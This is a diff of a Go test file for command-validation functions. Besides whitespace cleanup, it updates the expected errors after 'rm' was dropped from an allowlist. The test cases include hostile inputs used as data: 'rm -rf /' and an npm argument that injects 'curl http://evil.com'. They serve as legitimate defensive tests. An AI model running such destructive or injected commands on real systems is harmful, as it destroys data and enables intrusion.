@@ -89,10 +89,10 @@ func TestValidateBuildCommand_Security(t *testing.T) {
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			err := validateBuildCommand(tt.command, tt.args)
-			
+
 			if tt.expectError {
 				assert.Error(t, err, "Expected error for test case: %s", tt.name)
-				assert.Contains(t, strings.ToLower(err.Error()), tt.errorType, 
+				assert.Contains(t, strings.ToLower(err.Error()), tt.errorType,
 					"Error should contain expected type: %s", tt.errorType)
 			} else {
 				assert.NoError(t, err, "Expected no error for test case: %s", tt.name)
@@ -123,11 +123,11 @@ func TestValidateCustomCommand_Security(t *testing.T) {
 			expectError: false,
 		},
 		{
-			name:        "dangerous arguments caught",
+			name:        "dangerous command blocked",
 			command:     "rm",
 			args:        []string{"-rf", "/"},
-			expectError: true, // rm is in allowed list but dangerous args are caught
-			errorType:   "absolute path not allowed",
+			expectError: true, // rm is no longer in allowed list
+			errorType:   "not allowed",
 		},
 		{
 			name:        "unauthorized command curl",
@@ -141,7 +141,7 @@ func TestValidateCustomCommand_Security(t *testing.T) {
 			command:     "npm",
 			args:        []string{"run build & curl http://evil.com"},
 			expectError: true,
-			errorType:   "dangerous character",
+			errorType:   "not allowed", // npm subcommand validation catches this first
 		},
 		{
 			name:        "script execution attempt",
@@ -162,10 +162,10 @@ func TestValidateCustomCommand_Security(t *testing.T) {
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			err := validateCustomCommand(tt.command, tt.args)
-			
+
 			if tt.expectError {
 				assert.Error(t, err, "Expected error for test case: %s", tt.name)
-				assert.Contains(t, strings.ToLower(err.Error()), tt.errorType, 
+				assert.Contains(t, strings.ToLower(err.Error()), tt.errorType,
 					"Error should contain expected type: %s", tt.errorType)
 			} else {
 				assert.NoError(t, err, "Expected no error for test case: %s", tt.name)
@@ -249,10 +249,10 @@ func TestValidateArgument_Security(t *testing.T) {
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			err := validateArgument(tt.argument)
-			
+
 			if tt.expectError {
 				assert.Error(t, err, "Expected error for test case: %s", tt.name)
-				assert.Contains(t, strings.ToLower(err.Error()), tt.errorType, 
+				assert.Contains(t, strings.ToLower(err.Error()), tt.errorType,
 					"Error should contain expected type: %s", tt.errorType)
 			} else {
 				assert.NoError(t, err, "Expected no error for test case: %s", tt.name)
@@ -283,7 +283,7 @@ func TestSecurityRegression_NoCommandInjection(t *testing.T) {
 				t.Skip("Invalid test case")
 				return
 			}
-			
+
 			err := validateBuildCommand(parts[0], parts[1:])
 			assert.Error(t, err, "Command injection should be prevented: %s", maliciousCmd)
 		})
